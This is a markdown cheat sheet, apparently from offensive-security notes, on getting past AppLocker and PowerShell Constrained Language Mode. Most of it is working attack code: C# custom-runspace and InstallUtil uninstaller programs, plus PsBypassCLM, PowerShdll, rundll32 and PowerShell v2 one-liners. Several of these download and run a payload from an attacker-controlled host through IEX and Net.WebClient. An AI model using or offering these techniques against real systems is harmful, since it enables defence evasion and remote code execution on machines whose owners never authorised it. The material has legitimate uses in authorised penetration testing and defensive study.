---
tags:
  - Advanced
  - AppLocker_Bypass
  - Defense_Evasion
  - PowerShell
  - Windows
---

## AppLocker PowerShell Bypass
resources: [Microsoft CLM Documentation](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/)

> [!info] **AppLocker** puts PowerShell in Constrained Language Mode (CLM). Restricts dangerous operations like Add-Type, COM objects, .NET types.

### PowerShell Constrained Language Mode

#### Check Language Mode [Remote]
```powershell
$ExecutionContext.SessionState.LanguageMode
```

#### CLM Restrictions
> [!warning] CLM restrictions:
> - Cannot use **Add-Type**
> - Cannot access .NET types directly
> - Cannot use COM objects
> - Limited cmdlets available
> - No script block logging bypass

### Custom Runspaces Bypass
> [!tip] Create custom PowerShell runspace that bypasses CLM restrictions.

#### C# Custom Runspace
```csharp
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

class Bypass
{
    static void Main()
    {
        Runspace rs = RunspaceFactory.CreateRunspace();
        rs.Open();

        PowerShell ps = PowerShell.Create();
        ps.Runspace = rs;

        // Full language mode in custom runspace
        ps.AddScript("$ExecutionContext.SessionState.LanguageMode");
        var results = ps.Invoke();

        foreach (var result in results)
        {
            Console.WriteLine(result);
        }

        rs.Close();
    }
}
```

#### Execute Script via Runspace
```csharp
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

class Bypass
{
    static void Main()
    {
        Runspace rs = RunspaceFactory.CreateRunspace();
        rs.Open();

        PowerShell ps = PowerShell.Create();
        ps.Runspace = rs;

        string script = @"
            IEX(New-Object Net.WebClient).DownloadString('http://<AttackerIP>/payload.ps1')
        ";

        ps.AddScript(script);
        ps.Invoke();

        rs.Close();
    }
}
```

### PowerShell CLM Bypass Alternatives

#### PowerShell Version 2 [alternative]
> [!warning] PowerShell v2 doesn't support CLM. May not be available on modern systems.

```cmd
powershell -version 2 -c "IEX(New-Object Net.WebClient).DownloadString('http://<AttackerIP>/p.ps1')"
```

#### Check if PowerShell v2 Available [Remote]
```powershell
Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2
```

### Reflective Injection Techniques

#### PSByPassCLM [Remote]
> [!tip] Inject into PowerShell process to bypass CLM.

```cmd
PsBypassCLM.exe -cmd "IEX(New-Object Net.WebClient).DownloadString('http://<AttackerIP>/p.ps1')"
```

#### PowerShdll [Remote]
> [!tip] Run PowerShell with **rundll32** (no powershell.exe).

```cmd
rundll32.exe PowerShdll.dll,main -i
```

```cmd
rundll32.exe PowerShdll.dll,main IEX(New-Object Net.WebClient).DownloadString('http://<AttackerIP>/p.ps1')
```

#### NoPowerShell [Remote]
> [!tip] .NET-based PowerShell implementation.

```cmd
NoPowerShell.exe -c "Get-Process"
```

### InstallUtil CLM Bypass

#### Create Bypass DLL
```csharp
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

[System.ComponentModel.RunInstaller(true)]
public class Bypass : Installer
{
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        Runspace rs = RunspaceFactory.CreateRunspace();
        rs.Open();
        PowerShell ps = PowerShell.Create();
        ps.Runspace = rs;
        ps.AddScript("IEX(New-Object Net.WebClient).DownloadString('http://<AttackerIP>/p.ps1')");
        ps.Invoke();
        rs.Close();
    }
}
```

#### Execute [Remote]
```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U Bypass.dll
```
